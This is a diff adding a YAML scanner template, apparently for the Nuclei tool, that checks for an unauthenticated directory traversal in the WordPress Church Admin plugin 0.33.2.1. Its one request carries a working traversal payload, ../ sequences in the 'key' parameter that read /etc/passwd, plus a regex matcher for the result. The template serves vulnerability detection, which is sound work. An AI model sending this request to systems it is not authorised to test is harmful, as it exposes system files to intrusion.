@@ -1,0 +1,23 @@
+id: church-admin-lfi
+info:
+  author: 0x_Akoko
+  description: The "key" parameter of download.php from plugins/church-admin/display/download.php
+    is not sanitized and is vulnerable to a directory traversal type of attack.
+  name: Church Admin 0.33.2.1 - Unauthenticated Directory Traversal
+  reference:
+  - https://wpscan.com/vulnerability/8997
+  - https://id.wordpress.org/plugins/church-admin/
+  severity: high
+  tags: wordpress,wp-plugin,lfi
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd'
